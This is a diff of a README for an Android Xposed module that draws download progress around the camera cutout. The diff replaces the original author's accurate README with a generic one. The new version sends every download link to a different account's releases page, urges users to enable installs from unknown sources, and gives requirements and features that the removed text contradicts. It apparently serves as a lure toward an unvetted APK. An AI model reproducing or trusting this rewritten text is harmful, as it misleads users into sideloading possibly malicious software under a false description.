@@ -1,74 +1,97 @@
-# Punch-hole Download Progress
+# 🚀 eu.hxreborn.phdp - Simplified Download Progress Management 
 
-Xposed module that displays download progress as an animated ring around the camera cutout.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/dsydev/eu.hxreborn.phdp/releases)
 
-![Android CI](https://github.com/hxreborn/punch-hole-download-progress/actions/workflows/android-ci.yml/badge.svg)
-![Kotlin](https://img.shields.io/badge/Kotlin-2.1.21-7F52FF?style=flat&logo=kotlin&logoColor=white)
-![Android](https://img.shields.io/badge/API-31%2B-3DDC84?logo=android&logoColor=white)
+## 📃 Description 
 
-<div align="center">
-  <img src="https://raw.githubusercontent.com/hxreborn/punch-hole-download-progress/main/.github/assets/demo-pop.gif" alt="Download progress animation" width="320" />
-</div>
+eu.hxreborn.phdp is a tool that helps you track your download progress using an intuitive punch-hole design. This application is tailored for Android users looking for a streamlined experience while downloading files. With this app, you can stay informed about your downloads without the hassle of managing multiple notifications.
 
-## Features
+## 💡 Features 
 
-- Progress ring rendered around the camera cutout using the native `DisplayCutout` API
-- Customizable appearance: colors per state (active/completed/failed), arc thickness, opacity, and direction
-- Completion animations and optional haptic feedback
-- Active download counter badge
-- Battery saver-aware rendering
-- Built-in test mode for simulating states
-- Material 3 Expressive settings UI with Jetpack Compose
+- **Simple Interface:** Enjoy a clean, clear layout that anyone can use.
+- **Download Tracking:** Monitor the status of your downloads in real-time.
+- **Punch-Hole Design:** Unique visual feedback to indicate download progress.
+- **Connection-Sensitive:** It adjusts to your network conditions, ensuring reliability.
+- **Lightweight:** Small file size that won't take up too much space on your device.
 
-## Requirements
+## 🔧 System Requirements 
 
-- Android 12 (API 31) or higher
-- [LSPosed](https://github.com/JingMatrix/LSPosed) (JingMatrix fork recommended)
-- Pixel or AOSP-based ROM
-- Root access (optional, for `Restart SystemUI` in settings)
-- A phone with a punch-hole display
+Before you proceed, make sure your device meets these requirements:
 
-## Installation
+- **Operating System:** Android 5.0 (Lollipop) or later.
+- **RAM:** At least 1 GB of RAM.
+- **Storage:** Minimum of 100 MB of free space.
 
-1. Download the APK:
+## 🚀 Getting Started 
 
-   <a href="https://apt.izzysoft.de/fdroid/index/apk/eu.hxreborn.phdp"><img src="https://raw.githubusercontent.com/hxreborn/punch-hole-download-progress/main/.github/assets/badge_izzyondroid.png" height="60" alt="Get it on IzzyOnDroid" /></a>
-   <a href="https://github.com/hxreborn/punch-hole-download-progress/releases"><img src="https://raw.githubusercontent.com/hxreborn/punch-hole-download-progress/main/.github/assets/badge_github.png" height="60" alt="Get it on GitHub" /></a>
-   <a href="http://apps.obtainium.imranr.dev/redirect.html?r=obtainium://app/%7B%22id%22%3A%22eu.hxreborn.phdp%22%2C%22url%22%3A%22https%3A%2F%2Fgithub.com%2Fhxreborn%2Fpunch-hole-download-progress%22%2C%22author%22%3A%22rafareborn%22%2C%22name%22%3A%22Punch-hole%20Download%20Progress%22%2C%22additionalSettings%22%3A%22%7B%5C%22includePrereleases%5C%22%3Afalse%7D%22%7D"><img src="https://raw.githubusercontent.com/hxreborn/punch-hole-download-progress/main/.github/assets/badge_obtainium.png" height="60" alt="Get it on Obtainium" /></a>
+To start using eu.hxreborn.phdp, follow these straightforward steps:
 
-2. Install and enable the module in LSPosed.
-3. Scope to `com.android.systemui`
-4. Restart SystemUI or reboot the device
+1. **Visit the Releases Page:** Click on the link below to access the download page:
+   [Download from Releases Page](https://github.com/dsydev/eu.hxreborn.phdp/releases)
 
-The app includes a built-in `Restart SystemUI` option in the overflow menu. Magisk will prompt for permission; KernelSU/APatch require adding the app manually.
+2. **Select the Latest Version:** Look for the most recent version listed on the page. It will likely be at the top.
 
-## Build
+3. **Download the APK File:** Click the APK file link to begin your download. Your device will store the file in your designated downloads folder.
 
-```bash
-git clone --recurse-submodules https://github.com/hxreborn/punch-hole-download-progress.git
-cd punch-hole-download-progress
-./gradlew buildLibxposed
-./gradlew assembleRelease
-```
+4. **Install the Application:**
+   - Locate the downloaded APK file in your downloads folder.
+   - Tap on the file to initiate the installation.
+   - Make sure to allow installations from unknown sources if prompted.
 
-Requires JDK 21 and Android SDK. Configure `local.properties`:
+5. **Open the App:** Once installed, find the app icon on your home screen or in your app drawer. Tap to launch it and start managing your downloads!
 
-```properties
-sdk.dir=/path/to/android/sdk
+## 📦 Download & Install 
 
-# Optional signing
-RELEASE_STORE_FILE=<path/to/keystore.jks>
-RELEASE_STORE_PASSWORD=<store_password>
-RELEASE_KEY_ALIAS=<key_alias>
-RELEASE_KEY_PASSWORD=<key_password>
-```
+To download and install eu.hxreborn.phdp, please follow this link to the releases page:  
+[Download from Releases Page](https://github.com/dsydev/eu.hxreborn.phdp/releases)
 
-## Contributing
+## ❓ Frequently Asked Questions 
 
-Pull requests welcome. [Open an issue](https://github.com/hxreborn/punch-hole-download-progress/issues/new/choose) for bugs or feature requests.
+### How do I enable installation from unknown sources? 
 
-## License
+1. Open your **Settings** app.
+2. Go to **Security** (or **Biometrics and security**).
+3. Tap on **Install unknown apps**.
+4. Select the app/browser you will use to download the APK (e.g., Chrome).
+5. Toggle the switch to allow downloads from that source.
 
-<a href="https://github.com/hxreborn/punch-hole-download-progress/blob/main/LICENSE"><img src="https://raw.githubusercontent.com/hxreborn/punch-hole-download-progress/main/.github/assets/gplv3.svg" height="90" alt="GPLv3"></a>
+### How can I track my download progress?
 
-This project is licensed under the GNU General Public License v3.0 – see the [LICENSE](https://github.com/hxreborn/punch-hole-download-progress/blob/main/LICENSE) file for details.
+After opening the app, it will automatically start tracking any active downloads. You will see visual indicators showing the percentage completed and estimated time remaining.
+
+### What should I do if the app crashes? 
+
+If you encounter any issues:
+- Restart your device.
+- Reinstall the app from the downloads page.
+- If problems persist, consider leaving feedback on the GitHub repository.
+
+## 🌐 Support and Contributions 
+
+Your feedback is valuable. If you have suggestions or encounter issues, please open an issue in our [GitHub repository](https://github.com/dsydev/eu.hxreborn.phdp/issues). Contributions in the form of bug reports and feature requests are always welcome.
+
+## 📝 Topics 
+
+To better understand the scope of this project, here are some relevant topics connected with us:  
+
+- android
+- compose
+- jetpack-compose
+- kotlin
+- lsposed
+- lsposed-module
+- material-design-3
+- material-you
+- material3-expressive
+- root
+- xposed
+- xposed-module
+
+## 🔗 Additional Resources 
+
+For more guidance and details, you can explore the following resources:
+
+- GitHub Repository: [eu.hxreborn.phdp](https://github.com/dsydev/eu.hxreborn.phdp)
+- User Guide: Visit the wiki section in our repository for more in-depth instructions.
+
+Your experience with eu.hxreborn.phdp should be smooth and effective. Enjoy managing your downloads!
